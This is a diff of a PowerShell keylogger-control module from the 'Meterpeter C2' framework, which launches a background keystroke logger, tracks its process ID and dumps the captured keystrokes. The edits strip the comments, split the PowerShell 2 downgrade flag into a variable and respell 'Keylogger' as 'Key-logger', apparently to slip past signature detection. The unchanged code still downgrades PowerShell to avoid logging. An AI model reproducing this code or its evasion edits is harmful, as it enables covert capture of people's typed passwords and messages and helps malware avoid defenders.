@@ -1,60 +1,4 @@
-﻿<#
-.SYNOPSIS
-   Meterpeter C2 v2.10.12 keylogger start|stop
-
-   Author: @r00t-3xp10it (ssa redteam)
-   Tested Under: Windows 10 (19043) x64 bits
-   Required Dependencies: mscore.ps1 {auto-download}
-   Optional Dependencies: void.log, pid.log {auto-build}
-   PS cmdlet Dev version: v1.0.2
-
-.DESCRIPTION
-   Aux module of Meterpeter C2 to capture keystrokes
-
-.NOTES
-   This cmdlet does not depend of meterpeter C2 to
-   start|stop the capture of keyboard keystrokes.
-
-   Remark: mscore.ps1 cmdlet ( keylogger ) creates the
-   void.log + pid.log that this cmdlet requires to work,
-   and its executed by this cmdlet in background process.
-
-   Remark: mscore.ps1 captures keystrokes until is process
-   its manualy stoped, if target machine its restarted or
-   if keymanager.ps1 its invoked with -action 'stop' arg.
-
-.Parameter action
-   Accepts arguments: start, stop (default: start)
-
-.Parameter UsePS2
-   Use PS version 2 to exec keylogger? (default: false)
-  
-.EXAMPLE
-   PS C:\> .\keymanager.ps1 -action 'start'
-   Capture keystrokes until -action 'stop' its invoked
-
-.EXAMPLE
-   PS C:\> .\keymanager.ps1 -action 'start' -useps2 'true'
-   Capture keystrokes (PS v2) until -action 'stop' its invoked
-
-.EXAMPLE
-   PS C:\> .\keymanager.ps1 -action 'stop'
-   Stop keylogger process and dump keystrokes on console
-
-.INPUTS
-   None. You cannot pipe objects into keymanager.ps1
-
-.OUTPUTS
-   * Keylogger is working with ID: 1822
-     => Press CTRL+C to stop process ..
-   * Total Number of Keystrokes: 23
-   
-.LINK
-   https://github.com/r00t-3xp10it/meterpeter
-#>
-
-
-[CmdletBinding(PositionalBinding=$false)] param(
+﻿[CmdletBinding(PositionalBinding=$false)] param(
    [string]$Action="start",
    [string]$UsePS2="false"
 )
@@ -62,22 +6,10 @@
 
 #Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
-#Disable Powershell Command Logging for current session.
-Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 
 
 IF($Action -ieq "start")
 {
-
-   <#
-   .SYNOPSIS
-      Author: @r00t-3xp10it
-      Helper - Download\Execute mscore.ps1 (keylogger)
-
-   .NOTES
-      mscore.ps1 cmdlet (keylogger) creates void.log
-      and pid.log that this function requires to work.
-   #>
 
    If(-not(Test-Path -Path "$Env:TMP\mscore.ps1"))
    {
@@ -93,8 +25,9 @@ IF($Action -ieq "start")
       Remove-Item -Path "$Env:TMP\downgradeatt.log" -Force
       If($TestDowngradeAtt -iMatch '^(ps2versionfound)$')
       {
-         #Use powershell version 2 to execute keylogger
-         $cmdlineToExec = "powershell -version 2 -C Import-Module -Name `$Env:TMP\mscore.ps1 -Force"
+         $rrr = "-version"
+         #Use powershell $rrr 2 to execute keylogger
+         $cmdlineToExec = "powershell $rrr 2 -C Import-Module -Name `$Env:TMP\mscore.ps1 -Force"
       }
       Else
       {
@@ -116,11 +49,11 @@ IF($Action -ieq "start")
       {
          Start-Sleep -Milliseconds 600 #Give some time for log creation
          $PPID = (Get-Content "$Env:TMP\pid.log" | Where-Object { $_ -ne '' })
-         write-host "`n * Keylogger process started with ID: $PPID" -ForegroundColor Green
+         write-host "`n * Key-logger process started with ID: $PPID" -ForegroundColor Green
       }
       Else
       {
-         write-host "`n x Error: fail to start Keylogger background process .." -ForegroundColor Red -BackgroundColor Black
+         write-host "`n x Error: fail to start Key-logger background process .." -ForegroundColor Red -BackgroundColor Black
       }
    }
    Else
@@ -133,39 +66,29 @@ IF($Action -ieq "start")
 IF($Action -ieq "stop")
 {
 
-   <#
-   .SYNOPSIS
-      Author: @r00t-3xp10it
-      Helper - Stop\Dump keylogger process\keystrokes
-
-   .NOTES
-      mscore.ps1 cmdlet (keylogger) creates void.log
-      and pid.log that this function requires to work.
-   #>
-
    If(Test-Path -Path "$Env:TMP\pid.log")
    {
-      #Get keylogger PPID from logfile
+      #Get key-logger PPID from logfile
       $PPID = Get-Content "$Env:TMP\pid.log" | Where-Object { $_ -ne '' }
-      #Stop keylogger process by is PPID
+      #Stop key-logger process by is PPID
       Stop-Process -Id $PPID -Force
       If($?)
       {
-         write-host "`n* Keylogger process '$PPID' stoped." -ForegroundColor Green
+         write-host "`n* Key-logger process '$PPID' stoped." -ForegroundColor Green
       }
       Else
       {
-         write-host "`nx Error: fail to stop Keylogger process id: '$PPID'" -ForegroundColor Red -BackgroundColor Black
+         write-host "`nx Error: fail to stop Key-logger process id: '$PPID'" -ForegroundColor Red -BackgroundColor Black
       }
    }
    Else
    {
-      write-host "`nx Error: fail to retrieve keylogger process ID" -ForegroundColor Red -BackgroundColor Black
+      write-host "`nx Error: fail to retrieve key-logger process ID" -ForegroundColor Red -BackgroundColor Black
    }
 
 
    #Get the KeyStrokes
-   write-host "`nKeylogger Keystrokes Capture" -ForegroundColor Yellow
+   write-host "`nKeylogger Key-strokes Capture" -ForegroundColor Yellow
    write-host "----------------------------"
    If(Test-Path -Path "$Env:TMP\void.log")
    {
